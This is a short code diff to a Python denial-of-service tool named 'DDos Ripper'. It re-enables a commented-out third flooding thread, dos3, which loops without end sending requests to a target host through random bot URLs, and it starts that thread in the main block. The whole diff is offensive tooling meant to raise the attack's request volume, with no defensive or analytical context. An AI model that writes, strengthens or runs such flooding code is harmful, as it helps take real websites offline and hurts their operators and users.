@@ -108,11 +108,11 @@ def dos2():
 		bot_rippering(random.choice(bots)+"http://"+host)
 		w.task_done()
 
-#def dos3():
-  #  while True:
-  #      item = e.get()
-  #      bot_rippering(random.choice(bots)+"http://"+host)
-  #      e.task_done()
+def dos3():
+    while True:
+        item = e.get()
+        bot_rippering(random.choice(bots)+"http://"+host)
+        e.task_done()
 
 def usage():
 	print (''' \033[0;95mDDos Ripper
@@ -196,9 +196,9 @@ if __name__ == '__main__':
 			t2 = threading.Thread(target=dos2)
 			t2.daemon = True  # if thread is exist, it dies
 			t2.start()
-		#	t3 = threading/Thread(target=dos3)
-		#	t3.daemon = True # if thread is exist, it dies
-		#	t3.start()
+			t3 = threading.Thread(target=dos3)
+			t3.daemon = True # if thread is exist, it dies
+			t3.start()
 		start = time.time()
 		#tasking
 		item = 0
